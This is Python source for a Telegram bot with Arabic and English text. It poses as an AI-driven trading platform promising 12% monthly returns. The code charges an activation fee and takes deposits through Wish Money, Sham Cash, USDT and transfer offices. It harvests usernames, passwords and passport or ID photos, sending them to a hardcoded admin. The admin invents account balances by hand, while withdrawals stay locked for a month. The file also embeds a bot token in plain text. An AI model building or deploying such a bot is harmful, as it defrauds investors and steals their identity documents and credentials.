import datetime
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

TOKEN = "8972807153:AAGziTPF6AunZ7wPZXyp5Pha0pSfcmwG09U"
ADMIN_CHAT_ID = 6831262259
users_db = {}


def parse_balance(balance_str):
  if not balance_str:
    return 0.0
  cleaned = (
      str(balance_str)
      .replace("$", "")
      .replace("usd", "")
      .replace("USD", "")
      .strip()
  )
  try:
    return float(cleaned)
  except ValueError:
    return 0.0


def kb_main():
  return InlineKeyboardMarkup([
      [
          InlineKeyboardButton("👤 حسابي والأرباح", callback_data="menu_account"),
          InlineKeyboardButton("💵 إيداع أموال", callback_data="menu_deposit"),
      ],
      [
          InlineKeyboardButton(
              "💸 سحب أرباح/رأس مال", callback_data="menu_withdraw"
          )
      ],
  ])


def kb_admin(uid):
  return InlineKeyboardMarkup([
      [
          InlineKeyboardButton(
              "✅ تفعيل الحساب", callback_data=f"activate_{uid}"
          ),
          InlineKeyboardButton(
              "💰 إضافة رصيد مباشر", callback_data=f"prompt_add_{uid}"
          ),
      ],
      [
          InlineKeyboardButton(
              "💸 سحب رصيد مباشر", callback_data=f"prompt_sub_{uid}"
          )
      ],
  ])


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user_id = update.effective_user.id
  if user_id in users_db:
    await main_menu(update, context)
    return

  keyboard = [
      [
          InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar"),
          InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"),
      ]
  ]
  welcome_text = (
      "🤖 *مرحباً بك في مستقبل الاستثمار الذكي والتداول الآلي*\n"
      "نعتمد على خوارزميات الذكاء الاصطناعي لتحقيق أرباح تصل إلى **12% شهرياً**.\n\n🌐"
      " اختر اللغة / Please select your language:"
  )
  if update.message:
    await update.message.reply_text(
        welcome_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown",
    )


async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
  text = "📌 *لوحة التحكم الرئيسية للمنصة:*\nاختر العملية التي تريد القيام بها:"
  if update.callback_query:
    await update.callback_query.message.edit_text(
        text, reply_markup=kb_main(), parse_mode="Markdown"
    )
  else:
    await update.message.reply_text(
        text, reply_markup=kb_main(), parse_mode="Markdown"
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
  query = update.callback_query
  await query.answer()
  data = query.data
  user_id = query.from_user.id

  if data == "lang_ar":
    context.user_data["lang"] = "ar"
    terms = (
        "📊 *شروط وسياسات منصة التداول الذكي:*\n1. تفعيل الحساب برسوم **25$"
        "**.\n2. مسموح حساب واحد لكل مستخدم.\n3. يتطلب التسجيل إرسال صورة"
        " الهوية.\n4. الأرباح **12% شهرياً**.\n5. السحب بعد مرور شهر كامل.\n\nاضغط"
        " للموافقة:"
    )
    kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("✅ موافق ومتابعة", callback_data="accept_ar")]]
    )
    await query.message.edit_text(terms, reply_markup=kb, parse_mode="Markdown")

  elif data == "lang_en":
    context.user_data["lang"] = "en"
    terms = (
        "📊 *AI Trading Terms:*\n1. Fee **$25**.\n2. One account per user.\n3."
        " Requires ID photo.\n4. Profits **12% monthly**.\n5. Withdrawals"
        " after one month.\n\nClick to agree:"
    )
    kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("✅ Agree & Continue", callback_data="accept_en")]]
    )
    await query.message.edit_text(terms, reply_markup=kb, parse_mode="Markdown")

  elif data in ["accept_ar", "accept_en"]:
    context.user_data["state"] = "waiting_credentials"
    await query.message.edit_text(
        "📝 *إنشاء حساب تداول جديد*\nالرجاء إرسال اسم المستخدم وكلمة المرور"
        " بالشكل التالي:\n`username:password`",
        parse_mode="Markdown",
    )

  elif data == "menu_deposit":
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 إيداع ويش ماني", callback_data="dep_Wish")],
        [InlineKeyboardButton("📱 إيداع شام كاش", callback_data="dep_Sham")],
        [InlineKeyboardButton("🪙 إيداع USDT", callback_data="dep_USDT")],
        [
            InlineKeyboardButton(
                "🏢 إيداع مكتب تحويل", callback_data="dep_Office"
            )
        ],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_menu")],
    ])
    await query.message.edit_text(
        "💵 *اختر طريقة الإيداع:*", reply_markup=kb, parse_mode="Markdown"
    )

  elif data.startswith("dep_"):
    method = data.replace("dep_", "")
    context.user_data["deposit_method"] = method
    context.user_data["state"] = "waiting_deposit_amount"
    await query.message.edit_text(
        f"💵 *الطريقة: {method}*\nالرجاء إرسال المبلغ المراد إيداعه (مثال:"
        " `200$`):",
        parse_mode="Markdown",
    )

  elif data == "menu_withdraw":
    if user_id not in users_db or not users_db[user_id].get("activated_at"):
      await query.answer(
          "❌ حسابك غير مفعل أو غير مسجل، لا يمكنك السحب.", show_alert=True
      )
      return
    acc = users_db[user_id]
    days_passed = (datetime.datetime.now() - acc["activated_at"]).days
    if days_passed < 30:
      await query.answer(
          f"❌ عذراً، متبقي {30 - days_passed} يوم للسحب.", show_alert=True
      )
      return
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 سحب ويش ماني", callback_data="wit_Wish")],
        [InlineKeyboardButton("📱 سحب شام كاش", callback_data="wit_Sham")],
        [InlineKeyboardButton("🪙 سحب USDT", callback_data="wit_USDT")],
        [
            InlineKeyboardButton(
                "🏢 سحب مكتب تحويل", callback_data="wit_Office"
            )
        ],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_menu")],
    ])
    await query.message.edit_text(
        "💸 *اختر طريقة السحب:*", reply_markup=kb, parse_mode="Markdown"
    )

  elif data.startswith("wit_"):
    method = data.replace("wit_", "")
    context.user_data["withdraw_method"] = method
    context.user_data["state"] = "waiting_withdraw_amount"
    await query.message.edit_text(
        f"💸 *الطريقة: {method}*\nالرجاء إرسال المبلغ ومعلومات الاستلام:",
        parse_mode="Markdown",
    )

  elif data == "menu_account":
    if user_id in users_db:
      acc = users_db[user_id]
      w_status = "متاح ✅"
      if not acc.get("activated_at"):
        w_status = "غير مفعل ❌"
      else:
        dp = (datetime.datetime.now() - acc["activated_at"]).days
        if dp < 30:
          w_status = f"متاح بعد {30 - dp} يوم ⏳"
      msg = (
          f"👤 *معلومات حسابك:*\n🔑 بيانات الدخول: `{acc['creds']}`\n📊 الحالة:"
          f" {acc['status']}\n💰 الرصيد: *{acc['balance']}*\n💸 السحب:"
          f" {w_status}"
      )
      kb = InlineKeyboardMarkup(
          [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_menu")]]
      )
      await query.message.edit_text(msg, reply_markup=kb, parse_mode="Markdown")
    else:
      await query.answer("ليس لديك حساب مسجل بعد!", show_alert=True)

  elif data == "back_to_menu":
    await main_menu(update, context)

  elif data.startswith("activate_"):
    target_id = int(data.replace("activate_", ""))
    if target_id in users_db:
      users_db[target_id]["status"] = "مفعل 🟢"
      users_db[target_id]["activated_at"] = datetime.datetime.now()
      await query.message.edit_text(
          query.message.text + "\n\n✅ *تم التفعيل وبدء عداد الشهر بنجاح!*",
          parse_mode="Markdown",
      )
      try:
        await context.bot.send_message(
            chat_id=target_id,
            text=(
                "🎉 مبروك! تم تفعيل حسابك 🟢\nبدأت خوارزميات الذكاء الاصطناعي"
                " بالعمل:"
            ),
            reply_markup=kb_main(),
        )
      except:
        pass

  elif data.startswith("prompt_add_"):
    target_id = int(data.replace("prompt_add_", ""))
    context.user_data["admin_action"] = "add"
    context.user_data["admin_target_id"] = target_id
    await query.message.reply_text(
        f"💰 *إضافة رصيد للمستخدم ({target_id}):*\nأرسل المبلغ فقط (مثال:"
        " `100$`):",
        parse_mode="Markdown",
    )

  elif data.startswith("prompt_sub_"):
    target_id = int(data.replace("prompt_sub_", ""))
    context.user_data["admin_action"] = "sub"
    context.user_data["admin_target_id"] = target_id
    await query.message.reply_text(
        f"💸 *خصم رصيد من المستخدم ({target_id}):*\nأرسل المبلغ المراد خصمه فقط"
        " (مثال: `50$`):",
        parse_mode="Markdown",
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user_id = update.effective_user.id
  text = update.message.text

  if user_id == ADMIN_CHAT_ID:
    action = context.user_data.get("admin_action")
    target_id = context.user_data.get("admin_target_id")

    if action and target_id:
      context.user_data["admin_action"] = None
      context.user_data["admin_target_id"] = None
      val = parse_balance(text)

      if target_id in users_db:
        old_b = parse_balance(users_db[target_id]["balance"])
        if action == "add":
          new_b = old_b + val
          users_db[target_id]["balance"] = f"{new_b:.2f} $"
          await update.message.reply_text(
              f"✅ تمت الإضافة بنجاح للمستخدم `{target_id}`. الإجمالي:"
              f" *{new_b:.2f} $*",
              parse_mode="Markdown",
          )
          try:
            await context.bot.send_message(
                chat_id=target_id,
                text=(
                    f"💰 تم تحديث رصيدك!\nإجمالي الرصيد الحالي: *{new_b:.2f} $*"
                ),
                reply_markup=kb_main(),
                parse_mode="Markdown",
            )
          except:
            pass
        elif action == "sub":
          new_b = max(0.0, old_b - val)
          users_db[target_id]["balance"] = f"{new_b:.2f} $"
          await update.message.reply_text(
              f"✅ تم الخصم بنجاح للمستخدم `{target_id}`. المتبقي:"
              f" *{new_b:.2f} $*",
              parse_mode="Markdown",
          )
          try:
            await context.bot.send_message(
                chat_id=target_id,
                text=(
                    f"💸 تمت الموافقة على السحب واقتطاع المبلغ!\nرصيدك المتبقي:"
                    f" *{new_b:.2f} $*"
                ),
                reply_markup=kb_main(),
                parse_mode="Markdown",
            )
          except:
            pass
        return

    await update.message.reply_text(
        "💬 *لوحة تحكم الأدمن:*\nاستخدم الأزرار تحت رسائل المستخدمين للتعديل.",
        parse_mode="Markdown",
    )
    return

  if update.message.photo:
    creds = context.user_data.get("credentials", "غير متوفر")
    user = update.effective_user
    users_db[user_id] = {
        "creds": creds,
        "status": "غير مفعل 🔴",
        "balance": "0.00 $",
        "activated_at": None,
    }
    await update.message.reply_text(
        "⏳ *تم استلام صورة الهوية بنجاح!*\nجاري مراجعة الطلب خلال **24 ساعة**.",
        parse_mode="Markdown",
    )
    admin_caption = (
        "🚨 *طلب تفعيل وحساب جديد*\n👤 المستخدم: @"
        + str(user.username or user.first_name)
        + " (`"
        + str(user_id)
        + "`)\n🔑 البيانات: `"
        + str(creds)
        + "`"
    )
    await context.bot.send_photo(
        chat_id=ADMIN_CHAT_ID,
        photo=update.message.photo[-1].file_id,
        caption=admin_caption,
        reply_markup=kb_admin(user_id),
        parse_mode="Markdown",
    )
    context.user_data["state"] = None
    return

  state = context.user_data.get("state")
  if state == "waiting_credentials" or (text and ":" in text and user_id not in users_db):
    context.user_data["credentials"] = text
    context.user_data["state"] = "waiting_id_photo"
    await update.message.reply_text(
        "✅ تم حفظ البيانات.\n\n📸 *الخطوة الأخيرة:*\nالرجاء إرسال **صورة الهوية أو"
        " جواز السفر** الآن:",
        parse_mode="Markdown",
    )
    return

  if state == "waiting_deposit_amount":
    method = context.user_data.get("deposit_method", "")
    context.user_data["state"] = None
    user = update.effective_user
    await update.message.reply_text(
        "✅ تم استلام طلب الإيداع وإرساله للأدمن.", reply_markup=kb_main()
    )
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=(
            "💵 *طلب إيداع جديد*\n👤 المستخدم: @"
            + str(user.username or user.first_name)
            + " (`"
            + str(user_id)
            + "`)\n💳 الطريقة: "
            + str(method)
            + "\n💰 المبلغ: "
            + str(text)
        ),
        reply_markup=kb_admin(user_id),
        parse_mode="Markdown",
    )
    return

  if state == "waiting_withdraw_amount":
    method = context.user_data.get("withdraw_method", "")
    context.user_data["state"] = None
    user = update.effective_user
    await update.message.reply_text(
        "✅ تم استلام طلب السحب وجاري مراجعته.", reply_markup=kb_main()
    )
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=(
            "💸 *طلب سحب جديد*\n👤 المستخدم: @"
            + str(user.username or user.first_name)
            + " (`"
            + str(user_id)
            + "`)\n💳 الطريقة: "
            + str(method)
            + "\n📝 التفاصيل: "
            + str(text)
        ),
        reply_markup=kb_admin(user_id),
        parse_mode="Markdown",
    )
    return

  await update.message.reply_text(
      "⚠️ عذراً، الدردشة النصية غير مسموحة. يرجى استخدام الأزرار."
  )


def main():
  app = ApplicationBuilder().token(TOKEN).build()
  app.add_handler(CommandHandler("start", start))
  app.add_handler(CallbackQueryHandler(button_handler))
  app.add_handler(
      MessageHandler(
          (filters.TEXT | filters.PHOTO) & (~filters.COMMAND), handle_message
      )
  )
  print("البوت يعمل بكامل الخصائص...")
  app.run_polling()


if __name__ == "__main__":
  main()
      
